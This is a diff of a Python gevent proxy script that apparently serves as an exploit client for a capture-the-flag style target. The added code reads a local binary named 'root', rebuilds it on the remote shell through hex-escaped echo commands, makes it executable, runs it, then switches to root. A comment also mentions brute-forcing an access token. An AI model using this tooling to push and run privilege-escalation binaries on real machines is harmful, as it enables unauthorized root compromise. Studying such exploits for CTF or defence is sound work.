@@ -16,11 +16,11 @@ def waitk():
     wait_read(sys.stdin.fileno())
     return sys.stdin.read(1)
 
-def typein(s, text):
+def typein(s, text, sl=0.01):
     for t in text:
         if t == '\xff':
             t = '\xff\xff'
-        gevent.sleep(0.1)
+        gevent.sleep(sl)
         s.send(t)
 
 def copier(src, dst):
@@ -38,7 +38,7 @@ def handle(client, address):
     # Uncomment for production, after brute-forcing token
     #print remote_socket.recv(1024)
     #gevent.sleep(1)
-    #remote_socket.send('3573-1419883439.0-4a0ee4c7cbbe18cf39fd76348899c861\n')
+    #remote_socket.send('56487-1420134316.0-18deaee18219864d9b7711d8bab374ef\n')
     #gevent.sleep(1)
 
     gevent.spawn(copier, client, remote_socket)
@@ -62,10 +62,23 @@ def handle(client, address):
 
     print "press enter to get shell"
     waitk()
-    while True:
-        c = waitk()
-        remote_socket.send(c)
 
+    f = open("root")
+    d = f.read()
+    f.close()
+
+    typein(remote_socket, "reset\n")
+    gevent.sleep(2)
+    typein(remote_socket, "rm -f root\n")
+    for i in range(len(d)/128):
+        dd = d[i*128:(i+1)*128]
+        he = ''.join(["\\x%02x" % ord(ddd) for ddd in dd])
+        typein(remote_socket, 'echo -ne "{}" >> root\n'.format(he), sl=0)
+    
+    typein(remote_socket, "chmod +x root\n")
+    typein(remote_socket, "./root\n")
+    typein(remote_socket, "su root\n")
+    typein(remote_socket, "cd /home/root\n")
 
 server = gevent.server.StreamServer(local, handle)
 server.serve_forever()
